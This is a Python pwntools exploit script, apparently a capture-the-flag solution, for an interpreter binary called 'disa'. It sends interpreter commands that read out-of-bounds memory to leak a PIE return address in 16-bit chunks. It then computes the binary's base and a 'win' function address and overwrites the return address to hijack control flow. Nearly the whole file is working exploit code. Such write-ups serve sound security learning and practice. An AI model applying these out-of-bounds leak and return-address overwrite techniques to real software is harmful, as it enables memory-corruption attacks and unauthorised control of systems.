#!/usr/bin/python3
from pwn import *

# KEEP GOING
# PIE VALUE MORE THAN 32767 and no less than -32768

elf = context.binary = ELF("disa")

#b *interpreter+147
gs = '''
b *interpreter+632
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Addresses

# Functions
def set_dat(value: int):
    io.sendline(b"PUT 10") # Start by setting dat = 10
    io.sendline(b"JMP") # set addr = 10 because we will use cell[10] to do calculations
    io.sendline(b"PUT 0") # reset dat = 0
    io.sendline(b"ST") # set cells[10] = 0
    while value > 0:
        if value > 4000:
            io.sendline(b"PUT 4000")
            io.sendline(b"ADD")
            value = value - 4000
        else:
            io.sendline(b"PUT " + str(value).encode())
            io.sendline(b"ADD")
            value = value - value

    io.sendline(b"LD") # dat = cells[10]

# use indexes other than 10, which is used by set_dat
# Move to an index and set it to 0
def set_cell(index: int, value: int):
    set_dat(index)
    io.sendline(b"JMP") # addr = index
    io.sendline(b"PUT 0") # dat = 0
    io.sendline(b"ST") # cells[index] = 0
    while value > 0:
        if value > 4000:
            io.sendline(b"PUT 4000")
            io.sendline(b"ADD") # cells[index] += dat
            value = value - 4000
        else:
            io.sendline(b"PUT " + str(value).encode()) # dat = rest_of_value
            io.sendline(b"ADD") # cells[index] += dat
            value = value - value

"""

# Cannot use index = 10
def set_cell(index: int, value: int):
    set_index(index) # cells[index] = 0
    set_dat(value) # dat = value
    io.sendline(b"RD")
    io.sendline(b"ST") # cells[index] = value

"""
io = start()

io.sendlineafter(b"program:", b"PUT 4000")
io.sendline(b"ADD")
io.sendline(b"ADD")
io.sendline(b"PUT 212")
io.sendline(b"ADD") # cells[0] = 8212
io.sendline(b"LD") # dat = 8212
io.sendline(b"JMP") # addr = dat = 8212
io.sendline(b"LD") # dat = cells[8212]
io.sendline(b"RD") # print dat

# We will recv 2 bytes at a time from the return address
print(io.recvline())
pie0 = int(io.recvline(timeout=1).strip(), 10) # base 10 since it is printed as a decimal integer
log.info("pie0: %s" % pie0)
log.info("pie0: %s" % hex(pie0))

# Set dat = 1 and then add it to addr so we can read the next index: cells[8213]
io.sendline(b"PUT 0") # dat = 0
io.sendline(b"JMP") # addr = dat = 0
io.sendline(b"PUT 1") # dat = 1 
io.sendline(b"ADD") # cells[0] += 1 and since cells[0] contains 8212 it is now 8213
io.sendline(b"LD") # dat = 8213
io.sendline(b"JMP") # addr = dat = 8213
io.sendline(b"LD") # dat = cells[8213]
io.sendline(b"RD") # print dat

# recv pie1
pie1 = int(io.recvline(timeout=1).strip(), 10)
log.info("pie1: %s" % pie1)
log.info("pie1: %s" % hex(pie1))

# Set dat = 1 and then add it to addr so we can read the next index: cells[8214]
io.sendline(b"PUT 0") # dat = 0
io.sendline(b"JMP") # addr = dat = 0
io.sendline(b"PUT 1") # dat = 1 
io.sendline(b"ADD") # cells[0] += 1 and since cells[0] contains 8212 it is now 8214
io.sendline(b"LD") # dat = 8214
io.sendline(b"JMP") # addr = dat = 8214
io.sendline(b"LD") # dat = cells[8214]
io.sendline(b"RD") # print dat

# recv pie2
pie2 = int(io.recvline(timeout=1).strip(), 10)
log.info("pie2: %s" % pie2)
log.info("pie2: %s" % hex(pie2))

# Make them info hex and then string to concatenate them
log.info("Bit shifting to make the correct address")
if pie0 < 0:
    pie0 *= (-1)

if pie1 < 0:
    pie1 *= (-1)

if pie2 < 0:
    pie2 *= (-1)

pie0 = pie0 # do nothing, already at correct index
pie1 = pie1 << 16 # move 16 bits is two bytes of 0's meaning 0x0000
pie2 = pie2 << 32 # 32 bits is 4 bytes of 0's meaning 0x00000000
log.info("Pie0: %s" % hex(pie0))
log.info("Pie1: %s" % hex(pie1))
log.info("Pie2: %s" % hex(pie2))
pie_leak = pie0 + pie1 + pie2 # Can also use '|' between them since it is a bitwise or
log.info("Pie leak: %s" % hex(pie_leak))
elf.address = pie_leak - 0x53b # offset to pie base
log.info("Pie base: %s" % hex(elf.address))

# Now we need to overwrite the return address with the win function
win = elf.address + 0x229
log.info("Win: %s" % hex(win))
win0 = win & 0xFFFF # Now we only have the least significant 4 bytes of the address
win1 = (win & 0xFFFF0000) >> 16 # need it to be the correct value and then convert to 2 byte number
win2 = (win & 0xFFFF00000000) >> 32
log.info("Win0: %s" % hex(win0))
log.info("Win1: %s" % hex(win1))
log.info("Win2: %s" % hex(win2))

# Made some function to make the solution cleaner
set_cell(8212, win0)
set_cell(8213, win1)
set_cell(8214, win2)

io.sendline(b"END")

io.interactive()
